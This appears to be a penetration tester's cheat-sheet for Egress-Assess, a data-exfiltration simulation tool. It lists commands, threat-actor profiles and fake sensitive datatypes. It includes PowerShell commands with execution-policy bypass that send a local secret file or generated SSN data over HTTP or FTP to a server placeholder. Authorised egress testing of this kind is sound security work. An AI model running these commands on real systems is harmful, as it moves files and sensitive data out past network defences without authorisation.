Quick outbound connectivity checks. Fuller netcat workflows in pwk.txt.

# Egress-Assess Setup

## Overview

Client/server exfil simulation. Installed by misc/update.sh.

## Commands

    /opt/Egress-Assess/
    /opt/Egress-Assess-venv/bin/python Egress-Assess.py -h

    ./Egress-Assess.py --list-clients        dns, dns_resolved, ftp, http, https, icmp, sftp, smb, smtp
    ./Egress-Assess.py --list-servers        dns, ftp, http, https, icmp, sftp, smb, smtp
    ./Egress-Assess.py --list-actors         darkhotel, etumbot, putterpanda, zeus
    ./Egress-Assess.py --list-datatypes      cc, identity, ni, ssn

Transferred data is stored in data/.


# Egress-Assess HTTP

# PowerShell Client

## Overview

PowerShell module is client-only — not a one-for-one port of the Python CLI. Use single-dash parameters.

## Commands

    powershell -nop -exec bypass
    Import-Module .\EgressAssess.ps1

    Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype "c:\Users\lee\secret.txt"
    Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype ni -Size 5 -Fast

    Invoke-EgressAssess -Client ftp -IP <server> -Username lee -Password hack -Datatype "c:\Users\lee\secret.txt"

# Validation / False Positives

Comcast and many ISPs block outbound 25 and 445 — use alternate ports for SMTP and SMB egress tests.
Firewall allow on one port does not imply full egress — test the protocol you need for the engagement.
Egress-Assess success in lab does not map 1:1 to real DLP/proxy environments — document protocol and port tested.
PowerShell -Datatype may accept file paths differently than Python --file — verify on target before relying on syntax.
Blocked callback to <attacker IP> may be egress filtering, wrong listener port, or host firewall — confirm listener with a known-good port first.
